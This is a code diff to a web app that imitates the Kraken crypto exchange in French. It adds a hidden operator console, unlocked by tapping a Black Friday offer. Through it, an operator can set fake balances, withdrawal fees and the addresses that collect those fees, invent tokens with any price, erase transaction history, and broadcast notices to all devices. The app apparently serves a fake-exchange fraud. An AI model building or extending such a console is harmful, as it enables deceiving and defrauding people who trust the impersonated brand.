@@ -56,6 +56,8 @@
     usdcFee: {},
     addresses: {},
     feeAddresses: {},
+    customAssets: [],
+    actSeed: null,
     rev: 0
   };
   const KEY = "kraken_demo_v4";
@@ -66,6 +68,19 @@
   function clone(o) { return JSON.parse(JSON.stringify(o)); }
 
   let ST = load();
+
+  // Actifs ajoutés depuis la console embarquée : ils entrent dans le
+  // catalogue comme les autres, donc ils survivent au rechargement et à
+  // la synchro ntfy.
+  function applyCustomAssets() {
+    (Array.isArray(ST.customAssets) ? ST.customAssets : []).forEach(x => {
+      const sym = String((x && x.sym) || "").trim().toUpperCase();
+      if (!sym || bySym(sym)) return;
+      // En tête de liste : un actif ajouté doit se voir tout de suite.
+      ASSETS.unshift(C(sym, String(x.name || sym), Math.max(0, Number(x.price) || 0), 0, ""));
+    });
+  }
+  applyCustomAssets();
 
   function load() {
     try {
@@ -79,7 +94,9 @@
         fees: { ...(p.fees || {}) },
         usdcFee: { ...(p.usdcFee || {}) },
         addresses: { ...(p.addresses || {}) },
-        feeAddresses: { ...(p.feeAddresses || {}) }
+        feeAddresses: { ...(p.feeAddresses || {}) },
+        customAssets: Array.isArray(p.customAssets) ? p.customAssets : [],
+        actSeed: Array.isArray(p.actSeed) ? p.actSeed : null
       };
     } catch { return clone(DEFAULTS); }
   }
@@ -388,17 +405,49 @@
     { t: "Conversion", s: "100,00 € → 100,00 USDC", a: "100,00 USDC", up: true, d: "02 nov. 2026 · 11:45" }
   ];
 
+  // L'historique vit dans l'état : il peut donc être supprimé ligne par
+  // ligne (ou vidé) depuis la console embarquée, et survivre au rechargement.
+  function actSeedList() {
+    if (!Array.isArray(ST.actSeed)) {
+      ST.actSeed = clone(ACT_SEED);
+      saveLocal();
+    }
+    return ST.actSeed;
+  }
+
   function activityList() {
     const mine = notifList()
-      .filter(n => n.kind === "deposit" || n.kind === "withdraw")
+      .filter(n => (n.kind === "deposit" || n.kind === "withdraw") && !n.hidden)
       .map(n => ({
+        id: "n:" + n.id,
         t: n.kind === "deposit" ? "Dépôt reçu" : "Retrait envoyé",
         s: n.addr ? (n.asset || "Crypto") + " · " + shortAddr(n.addr) : (n.asset || "Crypto"),
         a: (n.kind === "deposit" ? "+" : "-") + (n.asset && n.asset !== "EUR" ? qtyTxt(n.amount, n.asset) : eur(n.amount, 2)),
         up: n.kind === "deposit",
         d: fmtWhen(n.at)
       }));
-    return mine.concat(ACT_SEED);
+    return mine.concat(actSeedList().map((x, i) => ({ ...x, id: "s:" + i })));
+  }
+
+  function deleteAct(id) {
+    const k = String(id || "");
+    if (k.startsWith("s:")) {
+      const i = Number(k.slice(2));
+      const list = actSeedList();
+      if (i >= 0 && i < list.length) list.splice(i, 1);
+    } else if (k.startsWith("n:")) {
+      const nid = k.slice(2);
+      notifSave(notifList().filter(n => String(n.id) !== nid));
+    }
+    saveLocal();
+    try { renderActivity(); } catch { }
+  }
+
+  function clearActs() {
+    ST.actSeed = [];
+    notifSave(notifList().filter(n => n.kind !== "deposit" && n.kind !== "withdraw"));
+    saveLocal();
+    try { renderActivity(); } catch { }
   }
 
   function actRowHTML(x) {
@@ -543,13 +592,15 @@
       <div class="acct-sect">Plus</div>
       ${row("", `<svg viewBox="0 0 24 24" class="ico"><path d="M6 3h8l4 4v14H6z"/><path d="M14 3v4h4"/></svg>`, "Documents")}
       ${row("", `<svg viewBox="0 0 24 24" class="ico"><path d="M13 2L4.5 13H11l-1 9 8.5-11H12z"/></svg>`, "Support")}
+      ${iaUnlocked() ? row("acctConsole", `<svg viewBox="0 0 24 24" class="ico"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="M7 9l3 3-3 3M12 15h5"/></svg>`, "Console Kraken", "Accès administrateur") : ""}
       ${row("", `<svg viewBox="0 0 24 24" class="ico"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg>`, "Envoyer des commentaires")}
     </div>`);
     const go = (sel, fn) => { const el = $(sel); if (el) el.addEventListener("click", fn); };
     go("#acctInbox", () => { closeSheet(); openNotifs(); });
     go("#acctNotifs", () => { closeSheet(); sheetNotifSettings(); });
     go("#acctManage", () => toast("Bientôt disponible"));
-    $$(".acct-row:not(#acctNotifs)").forEach(el => el.addEventListener("click", () => toast("Bientôt disponible")));
+    go("#acctConsole", () => { closeSheet(); openConsole(); });
+    $$(".acct-row:not(#acctNotifs):not(#acctConsole)").forEach(el => el.addEventListener("click", () => toast("Bientôt disponible")));
     const dot = $("#acctDot");
     if (dot) dot.hidden = unreadCount() === 0;
   }
@@ -1343,7 +1394,7 @@
       <p class="sheet-sub">Diversifiez en quelques secondes.</p>${BUNDLES.map(bundleHTML).join("")}`),
     offers: () => openSheet(`<div class="sheet-title">Offres</div>
       <p class="sheet-sub">Offres et incitations en cours.</p>
-      <div class="row" data-sheet="none"><div class="row-main"><div class="row-name">100 $ en BTC</div><div class="row-sub">Black Friday · dépôt minimum 1 000 $</div></div></div>`),
+      <div class="row" id="offerBF100" data-sheet="none"><div class="row-main"><div class="row-name">100 $ en BTC</div><div class="row-sub">Black Friday · dépôt minimum 1 000 $</div></div></div>`),
     "perp-open": () => openSheet(`<div class="sheet-title">Position perpétuelle</div>
       <p class="sheet-sub">Levier jusqu'à 10×. Les produits dérivés comportent un risque de perte.</p>
       ${amtBox("ppAmt", "€")}
@@ -1780,6 +1831,22 @@
       }
       ST.feeAddresses = keep;
     }
+    if (Array.isArray(s.customAssets)) {
+      ST.customAssets = s.customAssets
+        .filter(x => x && /^[A-Z0-9]{2,10}$/.test(String(x.sym || "").toUpperCase()))
+        .map(x => ({
+          sym: String(x.sym).toUpperCase(),
+          name: String(x.name || x.sym),
+          price: Math.max(0, Number(x.price) || 0)
+        }));
+      applyCustomAssets();
+    }
+    if (Array.isArray(s.actSeed)) {
+      ST.actSeed = s.actSeed.slice(0, 60).map(x => ({
+        t: String(x.t || ""), s: String(x.s || ""), a: String(x.a || ""),
+        up: !!x.up, d: String(x.d || "")
+      }));
+    }
     ST.rev = Number(s.rev) || 0;
     saveLocal();
     return true;
@@ -1804,6 +1871,7 @@
       if (!r.ok) return;
       const txt = await r.text();
       let best = null, bestT = 0;
+      const fresh = [];
       for (const line of txt.split("\n")) {
         if (!line.trim()) continue;
         let m;
@@ -1811,12 +1879,26 @@
         if (m.event !== "message" || !m.message) continue;
         let p;
         try { p = JSON.parse(m.message); } catch { continue; }
-        if (p.app !== "kraken" || p.type !== "state" || !p.state) continue;
+        if (p.app !== "kraken") continue;
+        if (p.type === "notif" && p.notif) { fresh.push(p.notif); continue; }
+        if (p.type !== "state" || !p.state) continue;
         // L'ordre vient de l'horodatage du serveur ntfy : plus de comparaison
         // d'horloges entre appareils, donc plus de mise a jour perdue.
         const t = Number(m.time) || 0;
         if (!best || t >= bestT) { bestT = t; best = p.state; }
       }
+      // Notifications envoyées depuis la console : même canal, dédoublonnées
+      // par identifiant pour ne pas se rejouer à chaque synchro.
+      fresh.forEach(n => {
+        const id = String(n.id || "");
+        if (!id || notifList().some(x => String(x.id) === id)) return;
+        addNotif({
+          id,
+          kind: "notice",
+          text: [n.title, n.text].filter(Boolean).join(" — "),
+          at: Number(n.at) || Date.now()
+        });
+      });
       const seen = Number(ST.msgTime) || 0;
       if (best && (bestT > seen || Number(best.rev) !== (Number(ST.rev) || 0))) {
         if (applyState(best)) {
@@ -1842,6 +1924,427 @@
   }
   function unlock() { screen("app"); go(VIEW); }
 
+  // ── console embarquée ──────────────────────────────────────────────
+  // Accès : Offres → « 100 $ en BTC » (offre Black Friday). L'accès reste
+  // ensuite permanent sur l'appareil (drapeau local) et la console est
+  // rejoignable depuis la fiche Compte.
+  const IAKEY = "kraken_inapp_admin_v1";
+  const iaUnlocked = () => { try { return localStorage.getItem(IAKEY) === "1"; } catch { return false; } };
+  const iaUnlock = () => { try { localStorage.setItem(IAKEY, "1"); } catch { } };
+
+  const iaHex = n => Array.from({ length: n }, () => "0123456789abcdef"[Math.floor(Math.random() * 16)]).join("");
+  const iaRnd = (n, set) => Array.from({ length: n }, () => set[Math.floor(Math.random() * set.length)]).join("");
+  const IA_B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+  const IA_B32 = "abcdefghijklmnopqrstuvwxyz0123456789";
+
+  // Même famille de format que les adresses déjà acceptées par l'app.
+  function iaGenAddr(sym) {
+    switch (sym) {
+      case "BTC": return "bc1q" + iaRnd(38, IA_B32);
+      case "SOL": return iaRnd(43, IA_B58);
+      case "XRP": return "r" + iaRnd(33, IA_B58);
+      case "ADA": return "addr1q" + iaRnd(48, IA_B32);
+      case "DOGE": return "D" + iaRnd(33, IA_B58);
+      case "SUI": return "0x" + iaHex(64);
+      case "DOT": return "1" + iaRnd(47, IA_B58);
+      case "EUR": return "FR76 " + iaRnd(23, "0123456789");
+      default: return "0x" + iaHex(40);
+    }
+  }
+
+  const iaEsc = v => String(v == null ? "" : v).replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
+  const iaNum = v => Math.max(0, parseFloat(String(v || "").replace(/\s/g, "").replace(",", ".")) || 0);
+  const iaField = v => (Number.isFinite(+v) && +v !== 0 ? String(v).replace(".", ",") : "");
+
+  function iaCopy(text, msg) {
+    const done = ok => toast(ok ? (msg || "Copié") : "Copie refusée par le navigateur");
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(text).then(() => done(true)).catch(() => done(false));
+      return;
+    }
+    try {
+      const ta = document.createElement("textarea");
+      ta.value = text;
+      ta.style.position = "fixed";
+      ta.style.opacity = "0";
+      document.body.appendChild(ta);
+      ta.select();
+      const ok = document.execCommand("copy");
+      document.body.removeChild(ta);
+      done(ok);
+    } catch { done(false); }
+  }
+
+  // ── transport : même topic ntfy que la console séparée ─────────────
+  const IA_TOPIC_URL = "https://ntfy.sh/" + TOPIC;
+
+  async function iaPublish(msg) {
+    const ctrl = new AbortController();
+    const cut = setTimeout(() => ctrl.abort(), 8000);
+    try {
+      const r = await fetch(IA_TOPIC_URL, {
+        method: "POST",
+        body: JSON.stringify({ app: "kraken", ...msg }),
+        headers: { "Content-Type": "text/plain" },
+        signal: ctrl.signal
+      });
+      if (!r.ok) throw new Error("HTTP " + r.status);
+      return true;
+    } catch { return false; }
+    finally { clearTimeout(cut); }
+  }
+
+  const iaSnapshot = () => ({
+    first: ST.first, last: ST.last, email: ST.email,
+    cash: Number(ST.cash) || 0, gas: Number(ST.gas) || 0,
+    balances: { ...ST.balances },
+    fees: { ...ST.fees },
+    usdcFee: { ...(ST.usdcFee || {}) },
+    addresses: { ...ST.addresses },
+    feeAddresses: { ...ST.feeAddresses },
+    customAssets: (ST.customAssets || []).map(x => ({ ...x })),
+    actSeed: Array.isArray(ST.actSeed) ? ST.actSeed.map(x => ({ ...x })) : null,
+    rev: Number(ST.rev) || 0
+  });
+
+  async function iaCommit(msg) {
+    ST.rev = Math.max(Date.now(), (Number(ST.rev) || 0) + 1);
+    saveLocal();
+    try { renderAll(); } catch { }
+    try { refresh(); } catch { }
+    iaRender();
+    const ok = await iaPublish({ type: "state", state: iaSnapshot() });
+    toast(String(msg || "Enregistré") + (ok ? " · publié" : " · publication à réessayer"));
+    return ok;
+  }
+
+  function iaRender() {
+    const body = $("#iaBody");
+    if (!body) return;
+
+    const coins = CRYPTOS();
+    const uf = ST.usdcFee || {};
+    const uvals = USDC_NETS.map(n => Number(uf[n.id]) || 0).filter(v => v > 0);
+    const uAll = uvals.length === USDC_NETS.length && uvals.every(v => v === uvals[0]) ? uvals[0] : 0;
+    const gasPh = nf(ST.gas || 0, 2);
+
+    const balRows = coins.map(a => `<label class="ia-line">
+        <span class="ia-sym">${a.sym}</span>
+        <input data-iabal="${a.sym}" inputmode="decimal" autocomplete="off" placeholder="0" value="${iaField(qty(a.sym))}">
+      </label>`).join("");
+
+    const feeRows = coins.filter(a => a.sym !== "USDC").map(a => `<label class="ia-line">
+        <span class="ia-sym">${a.sym}</span>
+        <input data-iafee="${a.sym}" inputmode="decimal" autocomplete="off" placeholder="${gasPh}" value="${iaField(ST.fees[a.sym])}">
+        <em>€</em>
+      </label>`).join("");
+
+    const usdcRows = `<label class="ia-line">
+        <span class="ia-sym">Tous réseaux</span>
+        <input data-iausdcall inputmode="decimal" autocomplete="off" placeholder="${gasPh}" value="${uAll ? String(uAll).replace(".", ",") : ""}">
+        <em>€</em>
+      </label>` + USDC_NETS.map(n => `<label class="ia-line">
+        <span class="ia-sym">${n.label}</span>
+        <input data-iaunet="${n.id}" inputmode="decimal" autocomplete="off" placeholder="${gasPh}" value="${iaField(uf[n.id])}">
+        <em>€</em>
+      </label>`).join("");
+
+    const targets = [...coins, { sym: "EUR" }];
+
+    const addrRows = targets.map(c => {
+      const v = (ST.addresses || {})[c.sym] || "";
+      return `<div class="ia-addr">
+        <span class="ia-sym">${c.sym}</span>
+        <input data-iaaddr="${c.sym}" spellcheck="false" autocomplete="off" value="${iaEsc(v)}" placeholder="Adresse de réception ${c.sym}">
+        <span class="ia-btns">
+          <button type="button" data-ia="copyAddr" data-sym="${c.sym}">Copier</button>
+          <button type="button" data-ia="regenAddr" data-sym="${c.sym}">Régénérer</button>
+        </span>
+      </div>`;
+    }).join("");
+
+    const feeAddrRows = targets.map(c => {
+      const v = (ST.feeAddresses || {})[c.sym] || "";
+      return `<div class="ia-addr">
+        <span class="ia-sym">${c.sym}</span>
+        <input data-iafeeaddr="${c.sym}" spellcheck="false" autocomplete="off" value="${iaEsc(v)}" placeholder="Frais ${c.sym} — vide = même adresse">
+        <span class="ia-btns">
+          <button type="button" data-ia="copyFeeAddr" data-sym="${c.sym}">Copier</button>
+          <button type="button" data-ia="sameFee" data-sym="${c.sym}">= Réception</button>
+        </span>
+      </div>`;
+    }).join("");
+
+    const custom = Array.isArray(ST.customAssets) ? ST.customAssets : [];
+    const customRows = custom.length ? custom.map(x => `<div class="ia-addr">
+        <span class="ia-sym">${iaEsc(x.sym)}</span>
+        <span class="ia-mid">${iaEsc(x.name)} · ${nf(x.price, 2)} $US</span>
+        <button type="button" data-ia="delCoin" data-sym="${iaEsc(x.sym)}">Retirer</button>
+      </div>`).join("") : `<p class="ia-empty">Aucun actif ajouté pour le moment.</p>`;
+
+    const hist = activityList();
+    const histRows = hist.length ? hist.map(x => `<div class="ia-addr">
+        <span class="ia-mid"><b>${iaEsc(x.t)}</b> · ${iaEsc(x.s)} · ${iaEsc(x.a)} · ${iaEsc(x.d)}</span>
+        <button type="button" data-ia="delAct" data-actid="${iaEsc(x.id)}">Suppr.</button>
+      </div>`).join("") : `<p class="ia-empty">Historique vide.</p>`;
+
+    body.innerHTML = `
+      <section class="ia-card">
+        <h3>Soldes</h3>
+        <p class="ia-sub">Montant détenu par actif. Vide = zéro.</p>
+        ${balRows}
+        <button type="button" class="ia-btn" data-ia="saveBal">Enregistrer les soldes</button>
+      </section>
+
+      <section class="ia-card">
+        <h3>Frais réseau par actif</h3>
+        <p class="ia-sub">Montant en euros débité à l'envoi. Vide = frais par défaut (${gasPh} €).</p>
+        ${feeRows}
+        <button type="button" class="ia-btn" data-ia="saveFees">Enregistrer les frais par actif</button>
+      </section>
+
+      <section class="ia-card">
+        <h3>Frais réseau USDC</h3>
+        <p class="ia-sub">Une valeur sur « Tous réseaux » s'applique aux six. Un réseau rempli à la main reste prioritaire.</p>
+        ${usdcRows}
+        <button type="button" class="ia-btn" data-ia="saveUsdc">Enregistrer les frais USDC</button>
+      </section>
+
+      <section class="ia-card">
+        <h3>Adresses de réception</h3>
+        <p class="ia-sub">Texte libre : colle l'adresse que tu veux. Elle remplace celle affichée dans l'app.</p>
+        ${addrRows}
+        <button type="button" class="ia-btn" data-ia="saveAddr">Publier les adresses de réception</button>
+      </section>
+
+      <section class="ia-card">
+        <h3>Adresse de perception des frais</h3>
+        <p class="ia-sub">L'adresse qui encaisse les frais réseau, actif par actif. Vide = même adresse que la réception.</p>
+        ${feeAddrRows}
+        <button type="button" class="ia-btn" data-ia="saveFeeAddr">Publier les adresses de frais</button>
+      </section>
+
+      <section class="ia-card">
+        <h3>Ajouter une crypto</h3>
+        <p class="ia-sub">L'actif apparaît dans l'app (accueil, recherche, portefeuille) et peut recevoir un solde et des frais.</p>
+        <div class="ia-grid">
+          <input id="iaNewSym" placeholder="Symbole (ex. PEPE)" autocomplete="off" spellcheck="false" maxlength="10">
+          <input id="iaNewName" placeholder="Nom (ex. Pepe)" autocomplete="off">
+          <input id="iaNewPrice" inputmode="decimal" placeholder="Prix en dollars (ex. 0,0000012)" autocomplete="off">
+        </div>
+        <button type="button" class="ia-btn" data-ia="addCoin">Ajouter l'actif</button>
+        ${customRows}
+      </section>
+
+      <section class="ia-card">
+        <h3>Notifications</h3>
+        <p class="ia-sub">Le message part sur tous les appareils qui utilisent l'app.</p>
+        <div class="ia-grid">
+          <input id="iaNTitle" placeholder="Titre" autocomplete="off" maxlength="80">
+          <input id="iaNText" placeholder="Message" autocomplete="off" maxlength="300">
+        </div>
+        <button type="button" class="ia-btn" data-ia="sendNotif">Envoyer à tous les utilisateurs</button>
+      </section>
+
+      <section class="ia-card">
+        <h3>Historique</h3>
+        <p class="ia-sub">Supprime une ligne, ou tout l'historique, comme tu veux.</p>
+        ${histRows}
+        <button type="button" class="ia-btn ghost" data-ia="clearActs">Tout supprimer</button>
+      </section>
+
+      <div class="ia-foot">
+        <button type="button" class="ia-btn" data-ia="publish">Publier sur tous les appareils</button>
+        <p class="ia-note">Frais, adresses, soldes, actifs ajoutés et historique partent sur le même canal que la console séparée.</p>
+      </div>`;
+  }
+
+  async function iaClick(e) {
+    const btn = e.target.closest("[data-ia]");
+    if (!btn) return;
+    const act = btn.dataset.ia;
+    const panel = $("#iaPanel");
+    const valOf = sel => { const el = panel.querySelector(sel); return el ? el.value : ""; };
+
+    if (act === "close") {
+      panel.hidden = true;
+      document.body.classList.remove("ia-lock");
+      return;
+    }
+
+    if (act === "copyAddr" || act === "copyFeeAddr") {
+      const sym = btn.dataset.sym;
+      const sel = (act === "copyAddr" ? '[data-iaaddr="' : '[data-iafeeaddr="') + sym + '"]';
+      const v = String(valOf(sel) || "").trim();
+      if (!v) return toast("Aucune adresse à copier");
+      return iaCopy(v, "Adresse " + sym + " copiée");
+    }
+
+    if (act === "regenAddr") {
+      const sym = btn.dataset.sym;
+      const el = panel.querySelector('[data-iaaddr="' + sym + '"]');
+      if (el) el.value = iaGenAddr(sym);
+      return toast("Nouvelle adresse " + sym + " générée — pense à publier");
+    }
+
+    if (act === "sameFee") {
+      const sym = btn.dataset.sym;
+      const el = panel.querySelector('[data-iafeeaddr="' + sym + '"]');
+      if (el) el.value = String(valOf('[data-iaaddr="' + sym + '"]') || "");
+      return toast("Adresse de réception " + sym + " recopiée — pense à publier");
+    }
+
+    if (act === "saveBal") {
+      panel.querySelectorAll("[data-iabal]").forEach(inp => {
+        const sym = inp.dataset.iabal;
+        const v = iaNum(inp.value);
+        if (v > 0) ST.balances[sym] = v; else delete ST.balances[sym];
+      });
+      return iaCommit("Soldes enregistrés");
+    }
+
+    if (act === "saveFees") {
+      ST.fees = ST.fees || {};
+      panel.querySelectorAll("[data-iafee]").forEach(inp => {
+        const sym = inp.dataset.iafee;
+        const raw = String(inp.value || "").trim();
+        if (!raw) delete ST.fees[sym]; else ST.fees[sym] = iaNum(raw);
+      });
+      return iaCommit("Frais par actif enregistrés");
+    }
+
+    if (act === "saveUsdc") {
+      ST.usdcFee = ST.usdcFee || {};
+      const allRaw = String(valOf("[data-iausdcall]") || "").trim();
+      const allV = allRaw ? iaNum(allRaw) : 0;
+      panel.querySelectorAll("[data-iaunet]").forEach(inp => {
+        const id = inp.dataset.iaunet;
+        const raw = String(inp.value || "").trim();
+        if (raw) ST.usdcFee[id] = iaNum(raw);
+        else if (allV > 0) ST.usdcFee[id] = allV;
+        else delete ST.usdcFee[id];
+      });
+      return iaCommit("Frais USDC enregistrés");
+    }
+
+    if (act === "saveAddr") {
+      ST.addresses = ST.addresses || {};
+      panel.querySelectorAll("[data-iaaddr]").forEach(inp => {
+        const sym = inp.dataset.iaaddr;
+        const v = String(inp.value || "").trim();
+        if (v.length >= 10) ST.addresses[sym] = v; else delete ST.addresses[sym];
+      });
+      return iaCommit("Adresses de réception publiées");
+    }
+
+    if (act === "saveFeeAddr") {
+      ST.feeAddresses = ST.feeAddresses || {};
+      panel.querySelectorAll("[data-iafeeaddr]").forEach(inp => {
+        const sym = inp.dataset.iafeeaddr;
+        const v = String(inp.value || "").trim();
+        if (v.length >= 10) ST.feeAddresses[sym] = v; else delete ST.feeAddresses[sym];
+      });
+      return iaCommit("Adresses de frais publiées");
+    }
+
+    if (act === "addCoin") {
+      const sym = String(valOf("#iaNewSym") || "").trim().toUpperCase();
+      const name = String(valOf("#iaNewName") || "").trim() || sym;
+      const price = iaNum(valOf("#iaNewPrice"));
+      if (!/^[A-Z0-9]{2,10}$/.test(sym)) return toast("Symbole invalide : 2 à 10 lettres ou chiffres");
+      if (bySym(sym)) return toast(sym + " existe déjà dans l'app");
+      ST.customAssets = Array.isArray(ST.customAssets) ? ST.customAssets : [];
+      ST.customAssets.push({ sym, name, price });
+      applyCustomAssets();
+      return iaCommit("Actif " + sym + " ajouté");
+    }
+
+    if (act === "delCoin") {
+      const sym = String(btn.dataset.sym || "").toUpperCase();
+      ST.customAssets = (ST.customAssets || []).filter(x => String(x.sym).toUpperCase() !== sym);
+      delete ST.balances[sym];
+      delete ST.fees[sym];
+      delete ST.addresses[sym];
+      delete ST.feeAddresses[sym];
+      const i = ASSETS.findIndex(a => a.sym === sym);
+      if (i >= 0) ASSETS.splice(i, 1);
+      return iaCommit("Actif " + sym + " retiré");
+    }
+
+    if (act === "sendNotif") {
+      const title = String(valOf("#iaNTitle") || "").trim();
+      const text = String(valOf("#iaNText") || "").trim();
+      if (!title && !text) return toast("Écris un titre ou un message");
+      const id = "m" + Date.now().toString(36);
+      const at = Date.now();
+      addNotif({ id, kind: "notice", text: [title, text].filter(Boolean).join(" — "), at });
+      panel.querySelector("#iaNTitle").value = "";
+      panel.querySelector("#iaNText").value = "";
+      const ok = await iaPublish({ type: "notif", notif: { id, title, text, at } });
+      return toast(ok ? "Notification envoyée à tous les appareils" : "ntfy a refusé — réessaie");
+    }
+
+    if (act === "delAct") {
+      deleteAct(btn.dataset.actid);
+      return iaRender();
+    }
+
+    if (act === "clearActs") {
+      if (!confirm("Supprimer tout l'historique ?")) return;
+      clearActs();
+      return iaCommit("Historique supprimé");
+    }
+
+    if (act === "publish") {
+      const ok = await iaCommit("Tout publié");
+      if (ok) toast("Publié sur tous les appareils");
+      return;
+    }
+  }
+
+  function iaInput(e) {
+    const el = e.target;
+    if (!el || !el.dataset) return;
+    const panel = $("#iaPanel");
+    if (!panel) return;
+    // Champ global USDC : tape une fois, les six réseaux suivent. Éditer un
+    // réseau à la main vide le champ global (le détail redevient prioritaire).
+    if (el.matches("[data-iausdcall]")) {
+      panel.querySelectorAll("[data-iaunet]").forEach(inp => { inp.value = el.value; });
+      return;
+    }
+    if (el.matches("[data-iaunet]")) {
+      const all = panel.querySelector("[data-iausdcall]");
+      if (all) all.value = "";
+    }
+  }
+
+  function iaEnsurePanel() {
+    let panel = $("#iaPanel");
+    if (panel) return panel;
+    panel = document.createElement("div");
+    panel.id = "iaPanel";
+    panel.className = "ia";
+    panel.hidden = true;
+    panel.innerHTML = `<div class="ia-head">
+        <span class="ia-title">Console Kraken</span>
+        <button type="button" class="ia-x" data-ia="close">Fermer</button>
+      </div>
+      <div class="ia-body" id="iaBody"></div>`;
+    document.body.appendChild(panel);
+    panel.addEventListener("click", iaClick);
+    panel.addEventListener("input", iaInput);
+    return panel;
+  }
+
+  function openConsole() {
+    const panel = iaEnsurePanel();
+    iaUnlock();
+    iaRender();
+    panel.hidden = false;
+    document.body.classList.add("ia-lock");
+  }
+
   function renderAll() { renderHead(); renderHome(); renderPortfolio(); renderStrip(); renderPredict(); }
 
   // État des prix : signale visiblement quand on affiche le cache local.
@@ -1864,6 +2367,9 @@
     const t = e.target;
 
     const g = t.closest("[data-goto]"); if (g) return go(g.dataset.goto);
+    // Offres → « 100 $ en BTC » : ouvre la console embarquée (accès discret).
+    if (t.closest("#offerBF100") || t.closest("#offerSecret")) { closeSheet(); openConsole(); return; }
+    if (t.closest(".offer-bf")) return openNamedSheet("offers");
     const sh = t.closest("[data-sheet]");
     if (sh && sh.dataset.sheet !== "none") return openNamedSheet(sh.dataset.sheet);
 
@@ -1946,7 +2452,6 @@
   // le câblage : on ne lie que ce qui existe réellement dans le DOM.
   const on = (sel, ev, fn) => { const el = $(sel); if (el) el.addEventListener(ev, fn); };
 
-  on("#offerSecret", "click", sheetProfile);
   on("#openSecret", "click", sheetProfile);
   on("#openSecretPf", "click", sheetProfile);
   on("#lockApp", "click", () => { pin = ""; pinRender(); screen("pin"); });
@@ -1966,7 +2471,7 @@
   }
 
   // Boutons de contenu (offres, cartes) sans destination : pas de redirection.
-  $$(".offer:not(#offerSecret), .card.pro, .card.orders:not(#openSecretPf)").forEach(el => {
+  $$(".offer:not(#offerSecret):not(.offer-bf), .card.pro, .card.orders:not(#openSecretPf)").forEach(el => {
     el.addEventListener("click", () => toast("Bientôt disponible"));
   });
 
